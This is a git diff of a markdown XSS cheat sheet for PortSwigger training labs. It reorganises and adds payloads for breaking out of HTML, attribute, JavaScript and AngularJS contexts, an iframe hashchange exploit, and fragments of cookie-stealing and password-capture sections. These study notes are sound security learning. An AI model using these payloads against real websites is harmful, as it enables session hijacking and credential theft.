@@ -6,6 +6,25 @@
 
 * [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)
 
+   * [XSS between HTML tags + DOM XSS](#xss-between-html-tags-and-dom-xss)
+   
+   * [XSS in HTML tag attributes](#xss-in-html-tag-attributes)
+   
+   * [XSS into JavaScript](#xss-into-javascript)
+   
+   * [XSS to Exploit Users](#xss-to-exploit-users)
+
+
+## Resources
+
+* https://portswigger.net/web-security/cross-site-scripting
+
+* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
+
+*  https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting
+
+* https://owasp.org/www-community/attacks/xss/  
+
 
 ## Recon
 
@@ -100,9 +119,11 @@ Test123parameterName
 <script>alert('Test123')</script>
 ```
 
+<br>
 
 * **Depending on that context, the following payloads can be used to break out of the context and potentially execute XSS:**
 
+## XSS between HTML tags and DOM XSS
 
 ### No encoding implemented on the injected data
 
@@ -113,44 +134,6 @@ Test123parameterName
 ```
 ```html
 <img src=x onerror=alert(1)>
-```
-
-### Input is within an HTML attribute
-
-* When the injected input is reflected within an HTML attribute, we need to close out the existing attribute/tag and introduce a new tag to execute JavaScript.
-
-    * Example:  \<img src="*user-input*" \>
-
-```html
-"><script>alert(1)</script>
-```
-
-### DOM XSS – Input is within the .innerHTML() Sink
-
-* If user-controllable source is passed to the .innerHTML() sink, then we can use an \<img\> tag, for example, to execute JavaScript.  The .innerHTML() property will not execute \<script\> tags.
-
-```html
-<img src=x onerror=alert(1)>
-```
-
-
-### Input is within an href attribute
-
-* The JavaScript pseudo protocol can be used when the data is being reflected within a href attribute.
-
-    * Example:  \<a href="*user-input*" \>
-
-```html
-javascript:alert(1)
-```
-
-
-### DOM XSS - AngularJS Expression
-
-* If the application is using Angular JS, try injecting the following payload to the input fields and see if the expression is getting processed –> {{2+2}} = 4
-
-```html
-{{ this.constructor.constructor('alert("foo")')() }}
 ```
 
 
@@ -181,6 +164,60 @@ javascript:alert(1)
 ```
 
 
+### DOM XSS – Input is within the .innerHTML() Sink
+
+* If user-controllable source is passed to the .innerHTML() sink, then we can use an \<img\> tag, for example, to execute JavaScript.  The .innerHTML() property will not execute \<script\> tags.
+
+```html
+<img src=x onerror=alert(1)>
+```
+
+
+### DOM XSS - AngularJS Expression
+
+* If the application is using Angular JS, try injecting the following payload to the input fields and see if the expression is getting processed –> {{2+2}} = 4
+
+   * Example:
+
+```html
+{{ this.constructor.constructor('alert("foo")')() }}
+```
+
+
+### DOM XSS jQuery selector sink - hashchange event
+
+   * Vulnerable code:
+
+```javascript
+<script>
+   $(window).on('hashchange', function(){
+      var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+         if (post) post.get(0).scrollIntoView();
+   });
+</script>
+```
+
+   * Exploit:  In this example, the src attribute points to the vulnerable page with an empty hash value. When the iframe is loaded, an XSS vector is appended to the hash, causing the hashchange event to fire. 
+
+```html
+<iframe src="https://VULNERABLE-APPLICATION/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```
+
+<br>
+
+## XSS in HTML tag attributes
+
+### Input is within an HTML attribute
+
+* When the injected input is reflected within an HTML attribute, we need to close out the existing attribute/tag and introduce a new tag to execute JavaScript.
+
+    * Example:  \<img src="*user-input*" \>
+
+```html
+"><script>alert(1)</script>
+```
+
+
 ### Angle brackets encoded but data is reflected in attribute
 
 * This will break out of the current attribute and introduce a new one that can execute JavaScript.  The last quotation mark is needed to ensure the syntax of the tag is correct.
@@ -191,6 +228,27 @@ javascript:alert(1)
 Test123” autofocus onfocus=alert(1) x=” 
 ```
 
+### Input is within an href attribute
+
+* The JavaScript pseudo protocol can be used when the data is being reflected within a href attribute.
+
+    * Example:  \<a href="*user-input*" \>
+
+```html
+javascript:alert(1)
+```
+
+### Input is within a canonical link tag
+
+* Example:   \<link rel="canonical" href='httpss://some-site.com/*user-input*' /\>
+
+```html
+' accesskey='x' onclick='alert(1)
+```
+
+<br>
+
+## XSS into JavaScript
 
 ### JavaScript String with single quote and backslash escaped
 
@@ -258,6 +316,9 @@ Test123” autofocus onfocus=alert(1) x=”
 ${alert(1)}
 ```
 
+<br>
+
+## XSS to Exploit Users
 
 ### Use XSS to steal user's cookies
 
@@ -273,6 +334,7 @@ body:document.cookie
 </script>
 ```
 
+<br>
 
 ### Use XSS to capture passwords
 
@@ -288,6 +350,7 @@ body:username.value+':'+this.value
 });">
 ```
 
+<br>
 
 ### Use XSS to perform CSRF
 
